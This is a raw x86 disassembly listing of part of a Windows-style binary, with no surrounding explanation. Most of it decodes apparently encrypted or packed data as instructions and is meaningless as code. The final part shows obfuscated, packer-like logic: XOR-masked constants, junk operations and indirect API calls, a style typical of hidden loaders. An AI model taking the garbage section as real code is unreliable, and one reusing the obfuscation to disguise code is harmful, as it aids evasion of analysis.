  418b9d:	xor    BYTE PTR [esi],ch
  418b9f:	out    0x63,eax
  418ba1:	test   eax,0x9e2386a1
  418ba6:	enter  0x4b61,0x99
  418baa:	fcom   DWORD PTR [edx]
  418bac:	jo     0x418c10
  418bae:	push   edi
  418baf:	imul   eax,DWORD PTR [ebp+0x9aed8c],0x850cfad8
  418bb9:	mov    dh,0xc0
  418bbb:	xchg   dl,dl
  418bbd:	cld    
  418bbe:	adc    al,0x81
  418bc0:	(bad)  
  418bc1:	ss jmp 0x418bc3
  418bc4:	xchg   ecx,esp
  418bc6:	sbb    ecx,DWORD PTR [esi+edx*8-0x525e731d]
  418bcd:	pop    ebp
  418bce:	mov    cl,0x13
  418bd0:	addr16 mov dh,0x3a
  418bd3:	ret    0xc75
  418bd6:	pushf  
  418bd7:	lahf   
  418bd8:	pop    ecx
  418bd9:	std    
  418bda:	in     eax,dx
  418bdb:	xor    DWORD PTR [eax+ebp*4-0x2de85b7e],ecx
  418be2:	jg     0x418b91
  418be4:	pop    esp
  418be5:	xor    eax,0x34c0213c
  418bea:	inc    edx
  418beb:	mov    ebx,0x3282e82c
  418bf0:	(bad)  
  418bf1:	mov    bl,0xf0
  418bf3:	mov    esi,0xf6ac8d6c
  418bf8:	jle    0x418bbe
  418bfa:	pop    es
  418bfb:	dec    esp
  418bfc:	cmp    eax,DWORD PTR [ecx+ecx*8+0x4bfd60a9]
  418c03:	jbe    0x418c62
  418c05:	dec    esp
  418c06:	inc    ebx
  418c07:	call   0x12a:0xfb8b245
  418c0e:	mov    al,0xd0
  418c10:	mov    esi,0xd50804f4
  418c15:	frstor [edx-0x16d38852]
  418c1b:	inc    ebp
  418c1c:	(bad)  
  418c1d:	idiv   BYTE PTR [eax]
  418c1f:	mov    eax,ds:0xca2abeee
  418c24:	js     0x418c0b
  418c26:	daa    
  418c27:	sub    dl,dl
  418c29:	outs   dx,BYTE PTR ds:[esi]
  418c2a:	mov    BYTE PTR [edx+0x77],bh
  418c2d:	out    0x3f,al
  418c2f:	add    eax,0xc6ec7b09
  418c34:	fldcw  WORD PTR [eax]
  418c36:	cmp    al,0x75
  418c38:	jb     0x418c74
  418c3a:	adc    al,0xd6
  418c3c:	push   eax
  418c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c3e:	jmp    0xfb81:0x2ce25659
  418c45:	mov    esp,0xb8f620a0
  418c4a:	fwait
  418c4b:	push   ss
  418c4c:	imul   ebx,DWORD PTR [ebp+0x134e4e6e],0xffffffab
  418c53:	pop    esi
  418c54:	mov    esp,0x59b4d420
  418c59:	mov    esi,0xd895bfec
  418c5e:	pop    es
  418c5f:	cdq    
  418c60:	adc    eax,0x48d017f4
  418c65:	jnp    0x418c3b
  418c67:	sub    BYTE PTR [edx],dl
  418c69:	xor    DWORD PTR [ebp-0x4188b1aa],eax
  418c6f:	sub    DWORD PTR gs:[edi-0x33],0x2b8107b6
  418c77:	rcl    BYTE PTR [esi],cl
  418c79:	or     esi,DWORD PTR [edi]
  418c7b:	stos   DWORD PTR es:[edi],eax
  418c7c:	mov    ebx,0x3605b034
  418c81:	enter  0x2442,0x2c
  418c85:	test   dl,0xe6
  418c88:	ret    0xbb61
  418c8b:	int3   
  418c8c:	xchg   esi,eax
  418c8d:	cmp    eax,DWORD PTR [ebx-0x111d5c25]
  418c93:	gs aad 0xea
  418c96:	call   0x86c2:0x908970ae
  418c9d:	(bad)  
  418c9e:	jae    0x418c4e
  418ca0:	bound  esp,QWORD PTR [edi+0x77a5134d]
  418ca6:	adc    eax,0xd4d44a2a
  418cab:	mov    BYTE PTR [ecx],ah
  418cad:	push   cs
  418cae:	(bad)  
  418caf:	push   esi
  418cb0:	push   0x67
  418cb2:	jecxz  0x418d17
  418cb4:	mov    ebp,0x6b22500a
  418cb9:	fild   QWORD PTR [edi+0x1f]
  418cbc:	in     al,0xc5
  418cbe:	sub    DWORD PTR [eax-0x75e33a6b],ebx
  418cc4:	fst    DWORD PTR [esi+ecx*2]
  418cc7:	leave  
  418cc8:	sbb    BYTE PTR [esi+0x39f4b5f2],ch
  418cce:	adc    BYTE PTR [eax],cl
  418cd0:	clc    
  418cd1:	(bad)  
  418cd2:	movq   QWORD PTR fs:[ebx+0x120ad987],mm6
  418cda:	cmp    al,0xdd
  418cdc:	dec    esi
  418cdd:	xor    al,0x78
  418cdf:	add    edi,ebx
  418ce1:	mov    edi,0xa30ba228
  418ce6:	or     BYTE PTR [bp+di],ah
  418ce9:	cmp    BYTE PTR [ebp+0x13],cl
  418cec:	fcmovu st,st(1)
  418cee:	pop    ecx
  418cef:	arpl   WORD PTR [ebx-0x416b2f28],cx
  418cf5:	(bad)  
  418cf7:	jnp    0x418c9f
  418cf9:	js     0x418cfc
  418cfb:	pop    ebx
  418cfc:	dec    ebx
  418cfd:	rcl    BYTE PTR [esi],cl
  418cff:	jno    0x418d1b
  418d01:	or     eax,0x19ca0734
  418d06:	sub    al,0x5
  418d08:	pop    ebp
  418d09:	pop    es
  418d0a:	call   0xed3c:0x96ddf58a
  418d11:	popf   
  418d12:	sbb    al,BYTE PTR [eax+0x51]
  418d15:	enter  0x4de0,0xf2
  418d19:	xchg   esi,eax
  418d1a:	xchg   BYTE PTR [eax+0x4b],al
  418d1d:	clc    
  418d1e:	jb     0x418cc5
  418d20:	push   esp
  418d21:	push   ss
  418d22:	sbb    al,BYTE PTR [edx+0x39]
  418d25:	adc    al,0xc0
  418d27:	adc    ecx,DWORD PTR [ecx+0x78]
  418d2a:	and    DWORD PTR [esi],ecx
  418d2c:	mov    BYTE PTR [edi],al
  418d2e:	or     bh,ah
  418d30:	xchg   edi,eax
  418d31:	xor    DWORD PTR [edx],edx
  418d33:	daa    
  418d34:	or     ebx,esp
  418d36:	test   al,0xe8
  418d38:	int3   
  418d39:	lahf   
  418d3a:	jbe    0x418da7
  418d3c:	(bad)  
  418d3d:	xchg   edi,eax
  418d3e:	fadd   st,st(4)
  418d40:	push   es
  418d41:	dec    esi
  418d42:	mov    al,ds:0x7793f8bf
  418d47:	xchg   BYTE PTR [ecx],ah
  418d49:	call   0x565d79b3
  418d4e:	mov    al,0x2c
  418d50:	push   0xbb5f58a1
  418d55:	fwait
  418d56:	cmp    eax,0x55aa2768
  418d5b:	or     ecx,DWORD PTR [ebx+0x27]
  418d5e:	das    
  418d5f:	shl    DWORD PTR [edx+0x37c89409],1
  418d65:	pop    edx
  418d66:	div    DWORD PTR [eax]
  418d68:	sbb    eax,DWORD PTR [eax+0x2cbe3faa]
  418d6e:	mov    WORD PTR es:[edi-0x3a],fs
  418d72:	jmp    0xcae6:0xfbf7aa02
  418d79:	sbb    bh,dh
  418d7b:	popa   
  418d7c:	mov    DWORD PTR [ebp-0x1e],edi
  418d7f:	(bad)  [eax+0x38]
  418d82:	mov    cs,WORD PTR [edi-0x4e]
  418d85:	dec    eax
  418d86:	fldcw  WORD PTR [edx]
  418d88:	in     al,0xf0
  418d8a:	int3   
  418d8b:	ja     0x418d7f
  418d8d:	sbb    al,0x27
  418d8f:	test   al,dl
  418d91:	pop    esi
  418d92:	addr16 cld 
  418d94:	xchg   ebx,eax
  418d95:	gs test al,0x91
  418d98:	popa   
  418d99:	cli    
  418d9a:	push   esp
  418d9b:	and    DWORD PTR [ebx+0x4e],ebp
  418d9e:	adc    ebx,DWORD PTR es:[eax]
  418da1:	mov    edi,0x4d7760c7
  418da6:	mov    al,0x6b
  418da8:	in     eax,0x83
  418daa:	(bad)  
  418dab:	(bad)  [ebp-0x4e]
  418dae:	stc    
  418daf:	or     al,0x5f
  418db1:	pop    ebx
  418db2:	nop
  418db3:	inc    ecx
  418db4:	mov    bl,cl
  418db6:	mov    esi,esi
  418db8:	call   0x90c6:0xfc9b948f
  418dbf:	mov    BYTE PTR [edi-0x4adcdad4],dh
  418dc5:	das    
  418dc6:	int3   
  418dc7:	loopne 0x418e0a
  418dc9:	mov    edi,0xda874600
  418dce:	inc    esp
  418dcf:	mov    edx,0x7c49adae
  418dd4:	mov    edx,0x54b5dadc
  418dd9:	push   0x61
  418ddb:	mov    bh,0x22
  418dde:	aad    0x85
  418de0:	loopne 0x418dea
  418de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418de3:	xchg   edi,edx
  418de5:	call   0xa519a774
  418dea:	in     eax,dx
  418deb:	cs adc eax,0x253242b0
  418df1:	rol    bl,1
  418df3:	inc    eax
  418df4:	jmp    0x3c35a35d
  418df9:	inc    ebx
  418dfa:	ins    BYTE PTR es:[edi],dx
  418dfb:	into   
  418dfc:	cdq    
  418dfd:	add    edi,ecx
  418dff:	data16 loope 0x418de6
  418e02:	into   
  418e03:	shl    esi,1
  418e05:	cmp    al,0x3f
  418e07:	call   0x8ee575bf
  418e0c:	in     al,0x2b
  418e0e:	push   eax
  418e0f:	push   edx
  418e10:	test   al,0xd4
  418e12:	jbe    0x418e6f
  418e14:	or     DWORD PTR [edi],ecx
  418e16:	std    
  418e17:	push   edx
  418e18:	jae    0x418e54
  418e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e1b:	add    DWORD PTR [ecx],edx
  418e1d:	adc    DWORD PTR [ecx+ecx*2-0x2de73936],ecx
  418e24:	xor    al,0x5d
  418e26:	je     0x418e74
  418e28:	mov    ds:0xcbc3429f,eax
  418e2d:	mov    bl,0x49
  418e2f:	rol    DWORD PTR [edi],cl
  418e31:	mov    eax,ds:0x76f29500
  418e36:	int3   
  418e37:	dec    esp
  418e38:	xchg   ebx,eax
  418e39:	ss shl ebx,1
  418e3c:	cdq    
  418e3d:	rcr    BYTE PTR [ebx+0x18],0x88
  418e41:	pop    es
  418e42:	mov    ds:0xee714013,eax
  418e47:	and    edx,edx
  418e49:	mov    dh,0x6d
  418e4b:	lods   al,BYTE PTR ds:[esi]
  418e4c:	sbb    ecx,esp
  418e4e:	jecxz  0x418e95
  418e50:	mov    al,0x5b
  418e52:	cmp    BYTE PTR [ecx+ebp*2+0x3097900a],ch
  418e59:	hlt    
  418e5a:	test   DWORD PTR [ecx-0x5c],esi
  418e5d:	mov    dh,0xfb
  418e5f:	loopne 0x418eb1
  418e61:	arpl   ax,si
  418e63:	or     esi,esp
  418e65:	sbb    dh,al
  418e67:	clc    
  418e68:	leave  
  418e69:	mov    dh,0xe0
  418e6b:	jle    0x418e48
  418e6d:	ja     0x418e50
  418e6f:	mov    esp,0xb7697871
  418e74:	ret    
  418e75:	mov    eax,ds:0xac9099cd
  418e7a:	cmp    cl,al
  418e7c:	add    eax,0xff86ba97
  418e81:	(bad)  
  418e82:	inc    edx
  418e83:	inc    ebp
  418e84:	jmp    0x9c2017c4
  418e89:	or     dh,BYTE PTR [ebp-0xe]
  418e8c:	imul   ebx,DWORD PTR [ecx],0x78
  418e8f:	imul   ebp,ecx,0x65e89813
  418e95:	adc    ah,BYTE PTR [edx+0x26]
  418e98:	cdq    
  418e99:	test   al,0xc7
  418e9b:	cmp    DWORD PTR [esi],esi
  418e9d:	enter  0xfaa5,0xc2
  418ea1:	fwait
  418ea2:	div    esp
  418ea4:	mov    bl,0xb1
  418ea6:	in     al,0x7c
  418ea8:	ins    DWORD PTR es:[edi],dx
  418ea9:	test   al,0x67
  418eac:	shr    BYTE PTR [eax+0x3e],1
  418eaf:	(bad)  
  418eb0:	inc    ebp
  418eb1:	push   esp
  418eb2:	cli    
  418eb3:	sbb    al,0xd0
  418eb5:	mov    ebp,ebp
  418eb7:	std    
  418eb8:	add    BYTE PTR [ecx-0x31],ch
  418ebb:	ins    BYTE PTR es:[edi],dx
  418ebc:	xor    al,BYTE PTR [ebx+0x2f587d80]
  418ec2:	clc    
  418ec3:	or     esp,DWORD PTR [ecx+ebp*2-0x119148ca]
  418eca:	lods   eax,DWORD PTR ds:[esi]
  418ecb:	ins    DWORD PTR es:[edi],dx
  418ecc:	sub    ecx,DWORD PTR [ecx]
  418ece:	call   0x134a1df6
  418ed3:	mov    al,ds:0x146bea1d
  418ed8:	repz xor dl,BYTE PTR [edi+0x52]
  418edc:	or     al,0xec
  418ede:	xchg   edi,eax
  418edf:	mov    dl,0x40
  418ee1:	dec    ebp
  418ee2:	inc    esp
  418ee3:	stos   BYTE PTR es:[edi],al
  418ee4:	push   eax
  418ee5:	daa    
  418ee6:	sbb    edi,DWORD PTR [ecx+0x5ce9bc1a]
  418eec:	imul   DWORD PTR [ecx-0x2]
  418eef:	push   ss
  418ef0:	les    edx,FWORD PTR [esi-0x303ad3f9]
  418ef6:	pop    edi
  418ef7:	fst    QWORD PTR [esp+edi*8+0x53]
  418efb:	pushf  
  418efc:	push   esi
  418efd:	pop    ebp
  418efe:	cmp    bl,ch
  418f00:	fmul   QWORD PTR [eax-0x792202aa]
  418f06:	sbb    BYTE PTR [ecx+ebp*8-0x697fed7a],cl
  418f0d:	cdq    
  418f0e:	mov    cl,0x1d
  418f10:	(bad)  
  418f11:	mov    al,0x76
  418f13:	adc    esi,DWORD PTR [esi]
  418f15:	cli    
  418f16:	lds    eax,FWORD PTR [esi-0x11]
  418f19:	icebp  
  418f1a:	sub    ebx,DWORD PTR [ecx-0x2e]
  418f1d:	mov    al,BYTE PTR [esi+0x74]
  418f20:	mov    ebp,0x239f609a
  418f25:	mov    ecx,0x2af98452
  418f2a:	mov    edi,0xb115abe0
  418f2f:	lea    ebx,[edx+0x5e]
  418f32:	xchg   edx,eax
  418f33:	fistp  WORD PTR ds:0xa788
  418f38:	nop
  418f39:	push   esi
  418f3a:	aad    0xa2
  418f3c:	scas   eax,DWORD PTR es:[edi]
  418f3d:	outs   dx,BYTE PTR ds:[esi]
  418f3e:	xchg   edx,eax
  418f3f:	cmp    dh,BYTE PTR [ebp+0x48c88154]
  418f45:	ins    BYTE PTR es:[edi],dx
  418f46:	dec    ebp
  418f47:	cmp    ebp,DWORD PTR [ebx+0x57]
  418f4a:	js     0x418f86
  418f4c:	sub    ebp,edi
  418f4e:	pmulhuw mm6,QWORD PTR [ecx-0x2e]
  418f52:	adc    al,0x66
  418f54:	mov    ds:0x37125572,eax
  418f59:	xor    ebx,DWORD PTR [ebx]
  418f5b:	cmp    al,0x32
  418f5d:	(bad)  
  418f5e:	mov    ebp,edi
  418f60:	jle    0x418f51
  418f62:	retf   0x9a9a
  418f65:	inc    eax
  418f66:	push   ebx
  418f67:	or     eax,0xb07c7331
  418f6c:	xchg   edi,eax
  418f6d:	call   0x348518a4
  418f72:	pop    ebx
  418f73:	sti    
  418f74:	imul   eax,DWORD PTR [ebx],0x1e689288
  418f7a:	add    eax,0x94f7d9e4
  418f7f:	and    ah,0x9e
  418f82:	nop
  418f83:	in     eax,0xda
  418f85:	pop    es
  418f86:	sti    
  418f87:	xchg   BYTE PTR [ecx-0x5a],al
  418f8a:	pop    esp
  418f8b:	les    edi,FWORD PTR [ebp+0x7a9fe4fd]
  418f91:	push   ecx
  418f92:	cdq    
  418f93:	jecxz  0x418f1d
  418f95:	test   BYTE PTR [ecx],cl
  418f97:	mov    ch,0xf4
  418f99:	sbb    cl,cl
  418f9b:	xor    al,0xcb
  418f9d:	xchg   edx,eax
  418f9e:	out    dx,eax
  418f9f:	jge    0x419016
  418fa1:	repnz mov al,ds:0x1c279075
  418fa7:	jno    0x418f8a
  418fa9:	jae    0x41900f
  418fab:	fnsave [ebx]
  418fad:	push   edx
  418fae:	cmp    ebx,edx
  418fb0:	cli    
  418fb1:	out    dx,al
  418fb2:	sahf   
  418fb3:	lock inc esp
  418fb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fb6:	pop    ecx
  418fb7:	cwde   
  418fb8:	inc    edi
  418fb9:	ins    BYTE PTR es:[edi],dx
  418fba:	push   ebx
  418fbb:	pop    ebp
  418fbc:	mov    ebp,0xc1484a52
  418fc1:	out    0x9b,eax
  418fc3:	jno    0x41902c
  418fc5:	(bad)  
  418fc6:	cmp    al,0x3f
  418fc8:	scas   al,BYTE PTR es:[edi]
  418fc9:	scas   al,BYTE PTR es:[edi]
  418fca:	leave  
  418fcb:	cmc    
  418fcc:	rcl    DWORD PTR [ebp+edi*2-0x6b],0x75
  418fd1:	mov    DWORD PTR ds:0x9129e6ec,ebx
  418fd7:	pop    es
  418fd8:	sbb    cl,BYTE PTR [ebx+0x4b]
  418fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fdc:	pop    esp
  418fdd:	sub    BYTE PTR [edx],cl
  418fdf:	lds    ebp,FWORD PTR [esi-0x77132b0f]
  418fe5:	mov    ?,WORD PTR [eax+0x2c]
  418fe8:	jns    0x418fe3
  418fea:	mov    WORD PTR [esi],ds
  418fec:	je     0x418fe8
  418fee:	add    BYTE PTR [ecx-0x46],ah
  418ff1:	out    dx,eax
  418ff2:	inc    ecx
  418ff3:	xor    esi,DWORD PTR [edi+0x7b]
  418ff6:	loopne 0x41904e
  418ff8:	cmp    BYTE PTR [esp+eax*2],al
  418ffb:	into   
  418ffc:	imul   ecx,eax,0xffffffc1
  418fff:	out    dx,eax
  419000:	mov    cl,0x9a
  419002:	test   eax,0x991d71c4
  419007:	dec    edx
  419008:	aaa    
  419009:	sbb    bh,BYTE PTR [edi]
  41900b:	jle    0x419009
  41900d:	call   0x59c00188
  419012:	call   0x7884:0x6b972d81
  419019:	add    eax,0x89f0970
  41901e:	loopne 0x418fa9
  419020:	js     0x419099
  419022:	daa    
  419023:	test   DWORD PTR [ecx+0x40f11593],ecx
  419029:	imul   esi,ecx,0x207932fc
  41902f:	mov    dl,BYTE PTR [ecx]
  419031:	aad    0x6
  419033:	loopne 0x419069
  419035:	push   es
  419036:	pushf  
  419037:	xchg   ecx,eax
  419038:	push   esp
  419039:	lods   eax,DWORD PTR ds:[esi]
  41903a:	jge    0x4190a1
  41903c:	mov    dl,0x28
  41903e:	pop    ebx
  41903f:	or     eax,0x8b4f9538
  419044:	push   ss
  419045:	fnstenv [edi-0x9]
  419048:	or     DWORD PTR [ecx-0x19],ebx
  41904b:	test   BYTE PTR [esi+ecx*4-0x1b],al
  41904f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419050:	xor    eax,0x160a235c
  419055:	mov    ebp,0x1db4c959
  41905a:	(bad)  
  41905b:	int    0x83
  41905d:	adc    ecx,DWORD PTR [ecx-0x5262f776]
  419063:	aam    0x26
  419065:	daa    
  419066:	es jmp 0x418feb
  419069:	push   es
  41906a:	pop    ecx
  41906b:	push   ds
  41906c:	add    eax,DWORD PTR [ebp-0x39914918]
  419072:	js     0x4190a8
  419074:	das    
  419075:	mov    ds:0xc3191301,al
  41907a:	inc    esi
  41907b:	out    0x37,eax
  41907d:	xor    eax,0x10022957
  419082:	xor    esp,edi
  419084:	pop    edi
  419085:	mov    eax,0x8c1891bc
  41908a:	call   0x3819:0x292cbb55
  419091:	(bad)  
  419094:	pop    esi
  419095:	cwde   
  419096:	cmp    eax,0xca04b8b5
  41909b:	jmp    0x8e16bd0a
  4190a0:	or     al,0x79
  4190a2:	and    eax,0x6dcd2db6
  4190a7:	jmp    0xba0b2410
  4190ac:	outs   dx,BYTE PTR ds:[esi]
  4190ad:	les    edx,FWORD PTR [ecx+0xe]
  4190b0:	xor    esi,DWORD PTR [ebx]
  4190b2:	dec    ecx
  4190b3:	jnp    0x41910d
  4190b5:	cmpps  xmm2,XMMWORD PTR [esi+eax*2-0x7f],0x39
  4190bb:	push   esi
  4190bc:	and    ebp,DWORD PTR [ebx+ebx*1+0x166dbc73]
  4190c3:	jle    0x419095
  4190c5:	adc    BYTE PTR [esi-0x18],dl
  4190c8:	sbb    al,0xfa
  4190ca:	popf   
  4190cb:	add    al,0xfe
  4190cd:	cmp    DWORD PTR [ecx],esi
  4190cf:	mov    esi,0xad3eada4
  4190d4:	xchg   ebx,eax
  4190d5:	jl     0x419147
  4190d7:	test   eax,0x265c61c3
  4190dc:	jecxz  0x41909c
  4190de:	in     eax,dx
  4190df:	cmc    
  4190e0:	pop    ds
  4190e1:	repz test DWORD PTR [ebp+0x1],esp
  4190e5:	sbb    ch,BYTE PTR [esi]
  4190e7:	inc    esi
  4190e8:	bnd js 0x4190ca
  4190eb:	jge    0x4190dd
  4190ed:	hlt    
  4190ee:	jge    0x41913b
  4190f0:	xor    al,0x1d
  4190f2:	jmp    0x419109
  4190f4:	jns    0x419091
  4190f6:	xor    edi,DWORD PTR [ebx]
  4190f8:	ror    DWORD PTR [ecx],cl
  4190fa:	adc    al,0x26
  4190fc:	sahf   
  4190fd:	cld    
  4190fe:	jmp    0x5bde:0xa5dc0af5
  419105:	outs   dx,DWORD PTR ds:[esi]
  419106:	xor    DWORD PTR [ecx-0x66fb3e61],esi
  41910c:	fisub  DWORD PTR [esi+0x6b]
  41910f:	xor    dh,cl
  419111:	mov    dh,0xcd
  419113:	ret    0xa291
  419116:	push   0x6bd2682b
  41911b:	sub    BYTE PTR [edi-0x18],0x6c
  41911f:	js     0x41919a
  419121:	adc    ah,BYTE PTR [ebx-0x3a]
  419124:	mov    ds:0xd6e6a344,eax
  419129:	jmp    0xa405:0x50a4ac41
  419130:	push   ds
  419131:	cmp    eax,0x71474274
  419136:	mov    ds:0xf0c221cc,eax
  41913b:	ins    DWORD PTR es:[edi],dx
  41913c:	mov    dl,BYTE PTR [esi]
  41913e:	pop    ecx
  41913f:	sbb    al,BYTE PTR [ecx+edx*2-0x7e]
  419143:	mov    al,BYTE PTR [ecx]
  419145:	adc    eax,0xc91905e4
  41914a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41914b:	xor    ebx,esi
  41914d:	xchg   edx,eax
  41914e:	xchg   edi,eax
  41914f:	mov    ds,WORD PTR [edx-0x2468660]
  419155:	hlt    
  419156:	fsub   DWORD PTR [ebx+0x26787df2]
  41915c:	arpl   cx,dx
  41915e:	imul   ecx,DWORD PTR [edx+0x5b],0xce5b839f
  419165:	adc    eax,0x342366b0
  41916a:	push   0xffffffe4
  41916c:	cmp    eax,DWORD PTR [ebx]
  41916e:	jb     0x419169
  419170:	xlat   BYTE PTR ds:[ebx]
  419171:	jb     0x419187
  419173:	idiv   BYTE PTR [edx+0xf]
  419176:	mov    ebx,?
  419178:	or     esi,DWORD PTR [edi-0x18]
  41917b:	cdq    
  41917c:	cdq    
  41917d:	push   edi
  41917e:	add    ecx,DWORD PTR [edx-0x5b58f7b2]
  419184:	mov    DWORD PTR [ebx],0xa4096ab2
  41918a:	or     al,0xad
  41918c:	adc    al,0x8a
  41918e:	push   edi
  41918f:	imul   esp,esi,0x3
  419192:	out    0xcc,al
  419194:	in     eax,0x39
  419196:	xchg   ebp,eax
  419197:	xor    al,0xe7
  419199:	jbe    0x4191f6
  41919b:	push   ecx
  41919c:	mov    ds:0x729208bc,eax
  4191a1:	cmp    dl,0xbc
  4191a4:	lds    ecx,FWORD PTR [ecx]
  4191a6:	xchg   ebx,eax
  4191a7:	addr16 retf 0xad6a
  4191ab:	pusha  
  4191ac:	dec    edi
  4191ad:	fld    DWORD PTR [ecx]
  4191af:	fistp  DWORD PTR [ebx]
  4191b1:	jl     0x4191f9
  4191b3:	xchg   ebx,eax
  4191b4:	ds out dx,eax
  4191b6:	inc    ebp
  4191b7:	outs   dx,BYTE PTR ds:[esi]
  4191b8:	aam    0x79
  4191ba:	mov    WORD PTR [ebx+0x558be845],cs
  4191c0:	lock xor eax,esi
  4191c3:	lea    eax,[eax+edx*1+0x3272db]
  4191ca:	mov    DWORD PTR [ebp-0x10],eax
  4191cd:	jmp    0x40deb0
  4191d2:	mov    eax,DWORD PTR [ebp-0x34]
  4191d5:	mov    edx,DWORD PTR [ebp+0xc]
  4191d8:	xor    edx,esi
  4191da:	lea    ecx,[ecx+edx*1+0x3272db]
  4191e1:	lea    edx,[ecx-0x3272db]
  4191e7:	xor    edx,esi
  4191e9:	cmp    edx,0xf89c95b6
  4191ef:	jne    0x40dd2f
  4191f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4191f8:	mov    edx,DWORD PTR [ebp+0xc]
  4191fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4191fe:	xor    edx,esi
  419200:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  419207:	xor    ecx,esi
  419209:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  419210:	xor    ebx,esi
  419212:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  419219:	mov    edx,DWORD PTR [ebp+0xc]
  41921c:	xor    edx,esi
  41921e:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  419225:	mov    eax,DWORD PTR [ebp+0xc]
  419228:	xor    eax,esi
  41922a:	add    eax,edi
  41922c:	pop    edi
  41922d:	pop    esi
  41922e:	pop    ebx
  41922f:	leave  
  419230:	ret    0x8
  419233:	push   ebp
  419234:	mov    ebp,esp
  419236:	mov    DWORD PTR ds:0x421a22,0xf89c85b5
  419240:	pop    ebp
  419241:	jmp    0x4193b5
  419246:	push   ebp
  419247:	mov    ebp,esp
  419249:	push   ecx
  41924a:	and    DWORD PTR ds:0x42c010,0x0
  419254:	jmp    0x419266
  419259:	mov    edx,DWORD PTR ds:0x42c010
  41925f:	inc    edx
  419260:	mov    DWORD PTR ds:0x42c010,edx
  419266:	cmp    DWORD PTR ds:0x42c010,0x19
  41926d:	jae    0x4192ae
  419273:	cmp    DWORD PTR ds:0x42c010,0x9
  41927a:	jne    0x419289
  419280:	push   DWORD PTR [ebp-0x18]
  419283:	call   DWORD PTR ds:0x42401c
  419289:	cmp    DWORD PTR ds:0x42c010,0x8
  419290:	jne    0x4192a3
  419296:	mov    edx,DWORD PTR ds:0x42c010
  41929c:	inc    edx
  41929d:	mov    DWORD PTR ds:0x42c010,edx
  4192a3:	jmp    0x419259
  4192a8:	or     DWORD PTR ds:0x42c004,ebx
  4192ae:	push   ecx
  4192af:	movzx  eax,BYTE PTR ds:0x42b00c
  4192b6:	and    DWORD PTR ds:0x42a01c,eax
  4192bc:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  4192c3:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4192ca:	mov    DWORD PTR ds:0x428008,0x13
  4192d4:	cmp    DWORD PTR ds:0x428008,0x0
  4192db:	je     0x41930a
  4192e1:	cmp    DWORD PTR ds:0x428008,0x20
  4192e8:	jne    0x4192fa
  4192ee:	push   DWORD PTR [ebp-0x14]
  4192f1:	push   DWORD PTR [ebp-0x1c]
  4192f4:	call   DWORD PTR ds:0x424020
  4192fa:	mov    eax,ds:0x428008
  4192ff:	dec    eax
  419300:	mov    ds:0x428008,eax
  419305:	jmp    0x4192d4
  41930a:	mov    eax,DWORD PTR [ebp-0x4]
  41930d:	and    DWORD PTR ds:0x429008,0x428020
  419317:	push   esi
  419318:	adc    DWORD PTR ds:0x42c000,0x1310
  419322:	mov    esi,DWORD PTR [ebp-0x8]
  419325:	mov    edx,0x7510893
  41932a:	xor    eax,edx
  41932c:	mov    ecx,DWORD PTR ds:0x42a000
  419332:	and    DWORD PTR ds:0x429014,ecx
  419338:	xor    esi,edx
  41933a:	mov    ecx,DWORD PTR ds:0x4237ed
  419340:	mov    ecx,DWORD PTR [ecx]
  419342:	sbb    DWORD PTR ds:0x42b00c,ecx
  419348:	mov    ecx,0x3272db
  41934d:	add    esi,ecx
  41934f:	add    eax,ecx
  419351:	imul   eax,esi
  419354:	mov    esi,DWORD PTR [ebp+0xc]
  419357:	cmp    esi,eax
  419359:	jne    0x419375
  41935f:	mov    eax,DWORD PTR [ebp-0x4]
  419362:	mov    esi,DWORD PTR [ebp-0x8]
  419365:	xor    eax,edx
  419367:	xor    esi,edx
  419369:	add    eax,ecx
  41936b:	add    esi,ecx
  41936d:	imul   eax,esi
  419370:	jmp    0x4193b0
  419375:	mov    eax,DWORD PTR [ebp+0xc]
  419378:	mov    eax,DWORD PTR [eax+0x78]
  41937b:	mov    DWORD PTR [ebp+0xc],eax
  41937e:	mov    eax,DWORD PTR [ebp-0x4]
  419381:	mov    esi,DWORD PTR [ebp-0x8]
  419384:	xor    eax,edx
  419386:	xor    esi,edx
  419388:	add    eax,ecx
  41938a:	add    esi,ecx
  41938c:	imul   eax,esi
  41938f:	mov    esi,DWORD PTR [ebp+0xc]
  419392:	cmp    esi,eax
  419394:	mov    eax,DWORD PTR [ebp-0x4]
  419397:	je     0x419362
  41939d:	xor    eax,edx
  41939f:	add    eax,ecx
  4193a1:	mov    ecx,DWORD PTR [ebp+0xc]
  4193a4:	imul   eax,ecx
  4193a7:	add    eax,DWORD PTR [ebp+0x8]
  4193aa:	mov    DWORD PTR [ebp+0xc],eax
  4193ad:	mov    eax,DWORD PTR [ebp+0xc]
  4193b0:	pop    esi
  4193b1:	leave  
  4193b2:	ret    0x8
  4193b5:	push   ebp
  4193b6:	mov    ebp,esp
  4193b8:	sub    esp,0x80
  4193be:	push   ebx
  4193bf:	push   esi
  4193c0:	push   edi
  4193c1:	mov    DWORD PTR ds:0x42c010,0xf9a
  4193cb:	mov    DWORD PTR [ebp-0x3c],0x0
  4193d2:	dec    eax
  4193d3:	mov    eax,DWORD PTR [ebp-0x18]
  4193d6:	mov    DWORD PTR [ebp-0x18],eax
  4193d9:	adc    DWORD PTR ds:0x429014,0x42801c
  4193e3:	push   0x421a26
  4193e8:	call   DWORD PTR ds:0x42402c
  4193ee:	adc    DWORD PTR ds:0x428018,0x3fb
  4193f8:	push   0x0
  4193fa:	push   0x67
  4193fc:	sbb    DWORD PTR ds:0x42b008,0x4024
  419406:	push   0xc
  419408:	mov    DWORD PTR ds:0x429000,0x5718
  419412:	push   0x3
  419414:	and    DWORD PTR ds:0x42b004,0x67ab
  41941e:	push   0x2
  419420:	push   0x78769798
  419425:	or     DWORD PTR ds:0x428024,0x42c014
  41942f:	call   DWORD PTR ds:0x42400c
